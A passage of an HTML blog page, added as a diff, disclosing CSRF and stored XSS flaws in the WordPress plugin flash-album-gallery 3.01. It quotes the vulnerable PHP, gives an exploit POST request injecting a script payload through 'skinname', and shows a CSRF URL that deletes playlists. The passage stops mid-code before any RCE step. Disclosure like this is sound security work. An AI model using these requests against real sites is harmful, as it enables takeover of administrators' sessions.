@@ -1,0 +1,1402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" type="text/css" href="/theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/css/font-awesome.min.css">
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="index, follow" />
+  <meta name="author" content="Nikolai Tschacher" />
+  <meta name="description" content="Nikolai Tschacher's ideas and programming around security and computer science" />
+<meta property="og:site_name" content="Coding, Learning and IT Security"/>
+<meta property="og:type" content="blog"/>
+<meta property="og:title" content="Coding, Learning and IT Security"/>
+<meta property="og:description" content="Nikolai Tschacher's ideas and programming around security and computer science"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content=""/>
+  <title>Coding, Learning and IT Security</title>
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="">
+        <img src="/theme/img/profile.png" alt="Coding, Learning and IT Security" title="Coding, Learning and IT Security">
+      </a>
+      <h1><a href="">Coding, Learning and IT Security</a></h1>
+      <p></p>
+      <nav>
+        <ul class="list">
+          <li><a href="/pages/about.html#about">About</a></li>
+          <li><a href="/pages/contact.html#contact">Contact</a></li>
+          <li><a href="/pages/googlescraper-py.html#googlescraper-py">GoogleScraper.py</a></li>
+          <li><a href="/pages/projects.html#projects">Projects</a></li>
+          <li><a href="/pages/impressum.html#impressum">Site Notice</a></li>
+          <li><a href="/pages/svgcaptcha.html#svgcaptcha">SVGCaptcha</a></li>
+        </ul>
+      </nav>
+      <ul class="social">
+        <li><a class="sc-twitter" href="https://twitter.com/incolumitas_" target="_blank"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/NikolaiT" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-rss" href="//incolumitas/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+        <li><a class="sc-stack-overflow" href="http://stackoverflow.com/users/1052496/nikolai-tschacher" target="_blank"><i class="fa fa-stack-overflow"></i></a></li>
+      </ul>
+    </div>
+  </aside>
+  <main>
+    <nav>
+      <a href="">Home</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+    </nav>
+
+<article>
+  <header>
+    <h2><a href="/no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k.html#no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k">No 2. - flash-album-gallery: persistent XSS exploitet with help of XSRF leading to remote code execution.</a></h2>
+    <p>
+      Posted on Sa 27 Juli 2013 in <a href="/category/programming.html">Programming</a>
+      &#8226; Tagged with
+      <a href="/tag/exploit.html">Exploit</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/bug.html">Bug</a>,      <a href="/tag/security.html">Security</a>,      <a href="/tag/xss.html">Xss</a>,      <a href="/tag/rce.html">Rce</a>    </p>
+  </header>
+  <div>
+      <p><strong>PLUGIN:</strong> http://wordpress.org/plugins/flash-album-gallery/<br />
+<strong>AFFECTED VERSION:</strong> 3.01<br />
+<strong>DOWNLOADS:</strong> 840,714<br />
+<strong>RISK:</strong> MEDIUM/HIGH</p>
+<p>The following blog post addresses a critical (chain) of security issues
+in the version 3.01 of flash-album-gallery<br />
+which eventually leads to remote code execution. The exploit is not
+completely automatically and needs a minimal amount<br />
+of social engineering. Nevertheless I rate the danger at a medium/high
+level {Probably even worse than a fully automatable SQL injection).</p>
+<p>First of all, I need to say that the plugin code lacks a fair amount of
+secure programming techniques and has inherent design flaws as far<br />
+as I can say this [I am not a software engineer, I do security as a
+hobby]. Assumingly, this is a direct result of heterogenous and<br />
+evolutionary growth of the software.<br />
+I researched flash-album-gallery mainly in June 2013 and after some
+weeks I found a CSRF vulnerability in combination with<br />
+a stored XSS. But on the same time I was preparing to contact the
+author and reveal my findings, I noticed a new version and<br />
+the bug seemed to be found by an independent researcher. See below the
+lines <em>Fix: vulnerability with albums</em> and  <em>Fix: XSS bugs reported by Ken S for the White Fir Design Bug
+Bounty</em>.</p>
+<div class="highlight"><pre>= v3.00 - 26.06.2013 =
+* Fix: Free skins settings reset to default after plugin update
+* Fix: XSS bugs reported by Ken S for the White Fir Design Bug Bounty
+* Fix: small bugfixes
+* New: iOS application &#39;MyPGC&#39; for Flagallery plugin now available on the App Store
+
+= v2.78 - 26.06.2013 =
+* Fix: bundled free skins not copied to flagallery-skins directory
+
+= v2.77 - 25.06.2013 =
+* Fix: vulnerability with albums
+* Fix: PHP Notices
+* Fix: Compatibility with some modern themes
+* Update: New version of swfupload
+* Update: Compatibility with Wordpress SEO plugin
+* Update: Update code for default skins
+</pre></div>
+
+
+<p>I considered the issue as solved [To my shame] and called the
+researching an end and forgot about flash-album-gallery.<br />
+But currently, I was revisiting the code and saw that there is still
+exactly the same issue with another variable and file.</p>
+<p>The concerned file is music-box.php situated at
+/wp-content/plugins/flash-album-gallery/admin/music-box.php at LINE
+17. This is the vulnerable function:</p>
+<div class="highlight"><pre><span class="x">function flag_music_controler() {</span>
+<span class="x">    if (isset($_POST[&#39;importfolder&#39;]) &amp;&amp; $_POST[&#39;importfolder&#39;]){</span>
+<span class="x">        check_admin_referer(&#39;flag_addmp3&#39;);</span>
+<span class="x">        $mp3folder = $_POST[&#39;mp3folder&#39;];</span>
+<span class="x">        if ( !empty($mp3folder) )</span>
+<span class="x">            flagAdmin::import_mp3($mp3folder);</span>
+<span class="x">    }</span>
+<span class="x">    $mode = isset($_REQUEST[&#39;mode&#39;])? $_REQUEST[&#39;mode&#39;] : &#39;main&#39;;</span>
+<span class="x">    $action = isset($_REQUEST[&#39;bulkaction&#39;])? $_REQUEST[&#39;bulkaction&#39;] : false;</span>
+<span class="x">    if($action == &#39;no_action&#39;) {</span>
+<span class="x">        $action = false;</span>
+<span class="x">    }</span>
+<span class="x">    switch($mode) {</span>
+<span class="x">        case &#39;sort&#39;:</span>
+<span class="x">            include_once (dirname (__FILE__) . &#39;/playlist-sort.php&#39;);</span>
+<span class="x">            flag_playlist_order();</span>
+<span class="x">        break;</span>
+<span class="x">        case &#39;edit&#39;:</span>
+<span class="x">            $file = urlencode($_GET[&#39;playlist&#39;]);</span>
+<span class="x">            if(isset($_POST[&#39;updatePlaylist&#39;])) {</span>
+<span class="x">                $title = esc_html($_POST[&#39;playlist_title&#39;]);</span>
+<span class="x">                $descr = esc_html($_POST[&#39;playlist_descr&#39;]);</span>
+<span class="x">                $data = array();</span>
+<span class="x">                foreach($_POST[&#39;item_a&#39;] as $item_id =&gt; $item) {</span>
+<span class="x">                    if($action==&#39;delete_items&#39; &amp;&amp; in_array($item_id, $_POST[&#39;doaction&#39;]))</span>
+<span class="x">                        continue;</span>
+<span class="x">                    $data[] = $item_id;</span>
+<span class="x">                }</span>
+<span class="x">                flagGallery::flagSaveWpMedia();</span>
+<span class="x">                flagSavePlaylist($title,$descr,$data,$file);</span>
+<span class="x">            }</span>
+<span class="x">            if(isset($_POST[&#39;updatePlaylistSkin&#39;])) {</span>
+<span class="x">                flagSavePlaylistSkin($file);</span>
+<span class="x">            }</span>
+<span class="x">            include_once (dirname (__FILE__) . &#39;/manage-playlist.php&#39;);</span>
+<span class="x">            flag_playlist_edit();</span>
+<span class="x">        break;</span>
+<span class="x">        case &#39;save&#39;:</span>
+<span class="x">            if(isset($_POST[&#39;items_array&#39;])){</span>
+<span class="x">                $title = esc_html($_POST[&#39;playlist_title&#39;]);</span>
+<span class="x">                $descr = esc_html($_POST[&#39;playlist_descr&#39;]);</span>
+<span class="x">                $data = $_POST[&#39;items_array&#39;];</span>
+<span class="x">                $file = isset($_REQUEST[&#39;playlist&#39;])? urlencode($_REQUEST[&#39;playlist&#39;]) : false;</span>
+<span class="x">                flagGallery::flagSaveWpMedia();</span>
+<span class="x">                flagSavePlaylist($title,$descr,$data, $file);</span>
+<span class="x">            }</span>
+<span class="x">            if(isset($_GET[&#39;playlist&#39;])) {</span>
+<span class="x">                include_once (dirname (__FILE__) . &#39;/manage-playlist.php&#39;);</span>
+<span class="x">                flag_playlist_edit();</span>
+<span class="x">            } else {</span>
+<span class="x">                flag_created_playlists();</span>
+<span class="x">                flag_music_wp_media_lib();</span>
+<span class="x">            }</span>
+<span class="x">        break;</span>
+<span class="x">        case &#39;add&#39;:</span>
+<span class="x">            if(isset($_POST[&#39;items&#39;]) &amp;&amp; isset($_GET[&#39;playlist&#39;])){</span>
+<span class="x">                $added = $_POST[&#39;items&#39;];</span>
+<span class="x">            } elseif(isset($_GET[&#39;playlist&#39;])) {</span>
+<span class="x">                $added = $_COOKIE[&#39;musicboxplaylist_&#39;.urlencode($_GET[&#39;playlist&#39;])];</span>
+<span class="x">            } else {</span>
+<span class="x">                $added = false;</span>
+<span class="x">            }</span>
+<span class="x">            flag_music_wp_media_lib($added);</span>
+<span class="x">        break;</span>
+<span class="x">        case &#39;delete&#39;:</span>
+<span class="x">            flag_playlist_delete(urlencode($_GET[&#39;playlist&#39;]));</span>
+<span class="x">        case &#39;main&#39;:</span>
+<span class="x">            if(isset($_POST[&#39;updateMedia&#39;])) {</span>
+<span class="x">                flagGallery::flagSaveWpMedia();</span>
+<span class="x">                flagGallery::show_message( __(&#39;Media updated&#39;,&#39;flag&#39;) );</span>
+<span class="x">            }</span>
+<span class="x">        default:</span>
+<span class="x">            flag_created_playlists();</span>
+<span class="x">            flag_music_wp_media_lib();</span>
+<span class="x">        break;</span>
+<span class="x">    }</span>
+
+<span class="x">    }</span>
+</pre></div>
+
+
+<p>Well, alone in this function and its subsequent calls, there are more
+security bugs than I can descibe here.<br />
+But to just name the one critical I mentioned before, this POST request
+inserts tainted data into a file, which<br />
+is lateron echoed back to the admin menu which triggers an XSS.</p>
+<div class="highlight"><pre>============================================ EXPLOITING POST REQUEST ========================
+    Host: localhost
+    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+    Accept-Encoding: gzip, deflate
+    Cookie: {The wordpress cookie of the admin}
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 117
+
+    items_array[0]=notimportant<span class="err">&amp;</span>playlist_title=some_title<span class="err">&amp;</span>playlist_descr=some_description<span class="err">&amp;</span>mode=save<span class="err">&amp;</span>skinname=&quot;<span class="nt">&lt;script&gt;</span>alert(/Script Code/)<span class="nt">&lt;/script&gt;</span>
+=============================================================================================
+</pre></div>
+
+
+<p>Explanation:</p>
+<p>Due to inpropper coding style, this request is not protected by a nonce,
+which would prevent a CSRF attack. For explanation of nonces and why<br />
+they are impportant, look here:
+http://www.prelovac.com/vladimir/improving-security-in-wordpress-plugins-using-nonces.<br />
+However, the author<br />
+probably intended to protect it with a nonce, because he actually
+inserted one in the form field here:</p>
+<div class="highlight"><pre><span class="c">&lt;!--</span> <span class="err">#</span><span class="nx">new_playlist</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;new_playlist&quot;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;display: none;&quot;</span> <span class="o">&gt;</span>
+     <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;form_new_playlist&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$filepath</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">&quot;</span> <span class="nx">accept</span><span class="o">-</span><span class="nx">charset</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="o">&gt;</span>
+<span class="o">===&gt;</span> <span class="cp">&lt;?php</span> <span class="nx">wp_nonce_field</span><span class="p">(</span><span class="s1">&#39;flag_thickbox_form&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;new_playlist_mp3id&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;items_array&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
+     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;new_playlist_bulkaction&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;TB_bulkaction&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
+     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;mode&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;save&quot;</span> <span class="o">/&gt;</span>
+     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;page&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;music-box&quot;</span> <span class="o">/&gt;</span>
+     <span class="o">&lt;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="s2">&quot;3&quot;</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="s2">&quot;3&quot;</span> <span class="o">&gt;</span>
+</pre></div>
+
+
+<p>Unfortunately, this nonce is actually never checked with a appropriate
+function like<br />
+- <code>wp_verify_nonce($nonce, $action = -1)</code><br />
+- <code>check_ajax_referer( $action = -1, $query_arg = false, $die = true )</code> 
+- <code>check_admin_referer($action = -1, $query_arg = '_wpnonce')</code></p>
+<p>Henceforth, alone this constitutes a XSRF, which for itself is a
+security threat. Because of the missing nonce check in all cases of the
+switch statement<br />
+in the above code excerpt, this requests for example deletes any album
+specified by the GET parameter playlist <code>http://localhost/wordpress/wp-admin/admin.php?page=flag-music-box&amp;mode=delete&amp;playlist={Which?}</code></p>
+<p>But back to main issue. Remember that we can trick any wordpress admin
+with a poisoned page and a installation with this plugin to execute<br />
+the above cases in the switch statement. Now consider the case save.
+There is a call to a function named flagSavePlaylist().<br />
+This function saves a music playlist to a xml file. Every parameter
+that is written to the xml file is propperly escaped with<br />
+functions like htmlspechialchars(). But one parameter is (strangely)
+ignored. The variable $skin is populated with user<br />
+submitable input and later written to the xml file. (See below the two
+arrows). Please note, that an exploitation attempt will lead to an error
+message printed (See "!Error! ===&gt;" below) because <code>file_get_contents()</code> is
+called with a string constructed with the tainted $skin variable.
+Script code<br />
+rarily looks like valid paths. But this doesn't hinder the working of
+the flow of the exploitation process.</p>
+<p>file /wp-content/plugins/flash-album-gallery/admin/music-box.php at
+LINE 17:</p>
+<div class="highlight"><pre> <span class="kd">function</span> <span class="nx">flagSavePlaylist</span><span class="p">(</span><span class="nx">$title</span><span class="p">,</span><span class="nx">$descr</span><span class="p">,</span><span class="nx">$data</span><span class="p">,</span><span class="nx">$file</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nx">$skinaction</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">global</span> <span class="nx">$wpdb</span><span class="p">;</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">trim</span><span class="p">(</span><span class="nx">$title</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="nx">$title</span> <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nx">$title</span> <span class="o">=</span> <span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nx">$title</span><span class="p">),</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+            <span class="nx">$descr</span> <span class="o">=</span> <span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nx">$descr</span><span class="p">),</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">$file</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">$file</span> <span class="o">=</span> <span class="nx">sanitize_title</span><span class="p">(</span><span class="nx">$title</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nx">$data</span><span class="p">))</span>
+                    <span class="nx">$data</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nx">$data</span><span class="p">);</span>
+
+            <span class="nx">$flag_options</span> <span class="o">=</span> <span class="nx">get_option</span><span class="p">(</span><span class="s1">&#39;flag_options&#39;</span><span class="p">);</span>
+<span class="o">===&gt;</span>        <span class="nx">$skin</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinname&#39;</span><span class="cp">]</span><span class="p">)</span><span class="o">?</span> <span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinname&#39;</span><span class="cp">]</span> <span class="o">:</span> <span class="s1">&#39;music_default&#39;</span><span class="p">;</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">$skinaction</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">$skinaction</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinaction&#39;</span><span class="cp">]</span><span class="p">)</span><span class="o">?</span> <span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinaction&#39;</span><span class="cp">]</span> <span class="o">:</span> <span class="s1">&#39;update&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nx">$skinpath</span> <span class="o">=</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nx">$flag_options</span><span class="cp">[</span><span class="s1">&#39;skinsDirABS&#39;</span><span class="cp">]</span> <span class="p">).</span><span class="nx">$skin</span><span class="p">;</span>
+            <span class="nx">$playlistPath</span> <span class="o">=</span> <span class="nx">ABSPATH</span><span class="p">.</span><span class="nx">$flag_options</span><span class="cp">[</span><span class="s1">&#39;galleryPath&#39;</span><span class="cp">]</span><span class="p">.</span><span class="s1">&#39;playlists/&#39;</span><span class="p">.</span><span class="nx">$file</span><span class="p">.</span><span class="s1">&#39;.xml&#39;</span><span class="p">;</span>
+            <span class="k">if</span><span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span><span class="nx">$playlistPath</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">$skin</span> <span class="o">==</span> <span class="nx">$skinaction</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">$settings</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">$playlistPath</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="o">!</span><span class="nb">Error</span><span class="o">!</span> <span class="o">===&gt;</span>    <span class="nx">$settings</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">$skinpath</span> <span class="p">.</span> <span class="s2">&quot;/settings/settings.xml&quot;</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nx">$properties</span> <span class="o">=</span> <span class="nx">flagGallery</span><span class="o">::</span><span class="nx">flagGetBetween</span><span class="p">(</span><span class="nx">$settings</span><span class="p">,</span><span class="s1">&#39;&lt;properties&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;/properties&gt;&#39;</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nx">$data</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="nx">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;gallery&gt;</span>
+<span class="s1">    &lt;properties&gt;&#39;</span><span class="p">.</span><span class="nx">$properties</span><span class="p">.</span><span class="s1">&#39;&lt;/properties&gt;</span>
+<span class="s1">    &lt;category id=&quot;&#39;</span><span class="p">.</span><span class="nx">$file</span><span class="p">.</span><span class="err">&#39;&quot;</span><span class="o">&gt;</span>
+            <span class="o">&lt;</span><span class="nx">properties</span><span class="o">&gt;</span>
+                    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$title.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+                    <span class="o">&lt;</span><span class="nx">description</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$descr.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">description</span><span class="o">&gt;</span>
+<span class="o">===&gt;</span>        <span class="o">&lt;</span><span class="nx">skin</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$skin.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">skin</span><span class="o">&gt;</span>
+            <span class="o">&lt;/</span><span class="nx">properties</span><span class="o">&gt;</span>
+            <span class="o">&lt;</span><span class="nx">items</span><span class="o">&gt;</span><span class="s1">&#39;;</span>
+
+<span class="s1">                    foreach( (array) $data as $id) {</span>
+<span class="s1">                            $mp3 = get_post($id);</span>
+<span class="s1">                            if($mp3-&gt;post_mime_type == &#39;</span><span class="nx">audio</span><span class="p">/</span><span class="nx">mpeg</span><span class="s1">&#39;) {</span>
+<span class="s1">                                $thumb = get_post_meta($id, &#39;</span><span class="nx">thumbnail</span><span class="s1">&#39;, true);</span>
+<span class="s1">                                    $content .= &#39;</span>
+                    <span class="o">&lt;</span><span class="nx">item</span> <span class="n">id</span><span class="o">=</span><span class="s2">&quot;&#39;.$mp3-&gt;ID.&#39;&quot;</span><span class="o">&gt;</span>
+              <span class="o">&lt;</span><span class="nx">track</span><span class="o">&gt;</span><span class="s1">&#39;.wp_get_attachment_url($mp3-&gt;ID).&#39;</span><span class="o">&lt;/</span><span class="nx">track</span><span class="o">&gt;</span>
+              <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$mp3-&gt;post_title.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+              <span class="o">&lt;</span><span class="nx">description</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$mp3-&gt;post_content.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">description</span><span class="o">&gt;</span>
+              <span class="o">&lt;</span><span class="nx">thumbnail</span><span class="o">&gt;</span><span class="s1">&#39;.$thumb.&#39;</span><span class="o">&lt;/</span><span class="nx">thumbnail</span><span class="o">&gt;</span>
+            <span class="o">&lt;/</span><span class="nx">item</span><span class="o">&gt;</span><span class="s1">&#39;;</span>
+<span class="s1">                            }</span>
+<span class="s1">                    }</span>
+<span class="s1">                    $content .= &#39;</span>
+            <span class="o">&lt;/</span><span class="nx">items</span><span class="o">&gt;</span>
+    <span class="o">&lt;/</span><span class="nx">category</span><span class="o">&gt;</span>
+    <span class="o">&lt;/</span><span class="nx">gallery</span><span class="o">&gt;</span><span class="s1">&#39;;</span>
+<span class="s1">                    // Save options</span>
+<span class="s1">                    $flag_options = get_option(&#39;</span><span class="nx">flag_options</span><span class="s1">&#39;);</span>
+<span class="s1">                    if(wp_mkdir_p(ABSPATH.$flag_options[&#39;</span><span class="nx">galleryPath</span><span class="s1">&#39;].&#39;</span><span class="nx">playlists</span><span class="o">/</span><span class="s1">&#39;)) {</span>
+<span class="s1">                            if( flagGallery::saveFile($playlistPath,$content,&#39;</span><span class="nx">w</span><span class="s1">&#39;) ){</span>
+<span class="s1">                                    flagGallery::show_message(__(&#39;</span><span class="nx">Playlist</span> <span class="nx">Saved</span> <span class="nx">Successfully</span><span class="s1">&#39;,&#39;</span><span class="nx">flag</span><span class="s1">&#39;));</span>
+<span class="s1">                            }</span>
+<span class="s1">                    } else {</span>
+<span class="s1">                            flagGallery::show_message(__(&#39;</span><span class="nx">Create</span> <span class="nx">directory</span> <span class="nx">please</span><span class="p">:</span><span class="s1">&#39;,&#39;</span><span class="nx">flag</span><span class="s1">&#39;).&#39;</span><span class="s2">&quot;/&#39;.$flag_options[&#39;galleryPath&#39;].&#39;playlists/&quot;</span><span class="s1">&#39;);</span>
+<span class="s1">                    }</span>
+<span class="s1">            }</span>
+<span class="s1">    }</span>
+</pre></div>
+
+
+<p>Now we know that tainted [html/javascript] data is in a xml file. This
+is not dangerous by itself [But really bad at least].<br />
+But what if this data is written back to the browser without
+sanitation? Then we could write any script code within a admin<br />
+session.</p>
+<p>But this is exactly what happens here in the file /wp-content/plugins/flash-album-gallery/admin/music-box.php at LINE 386:</p>
+<div class="highlight"><pre><span class="x"> </span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$added</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">                                    &lt;input name=&quot;updateMedia&quot; class=&quot;button-primary&quot; style=&quot;float: right;&quot; type=&quot;submit&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Update Media&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
+<span class="x">                                    </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;json_encode&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">                                    &lt;select name=&quot;bulkaction&quot; id=&quot;bulkaction&quot;&gt;</span>
+<span class="x">                                            &lt;option value=&quot;no_action&quot; &gt;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s2">&quot;No action&quot;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/option&gt;</span>
+<span class="x">                                            &lt;option value=&quot;new_playlist&quot; &gt;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s2">&quot;Create new playlist&quot;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/option&gt;</span>
+<span class="x">                                    &lt;/select&gt;</span>
+<span class="x">                                    &lt;input name=&quot;showThickbox&quot; class=&quot;button-secondary&quot; type=&quot;submit&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Apply&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; onclick=&quot;if ( !checkSelected() ) return false;&quot; /&gt;</span>
+<span class="x">                                    </span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">                    &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">admin_url</span><span class="p">(</span> <span class="s1">&#39;media-new.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; class=&quot;button&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Upload Music&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/a&gt;</span>
+<span class="x">                                    &lt;input type=&quot;hidden&quot; id=&quot;items_array&quot; name=&quot;items_array&quot; value=&quot;&quot; /&gt;</span>
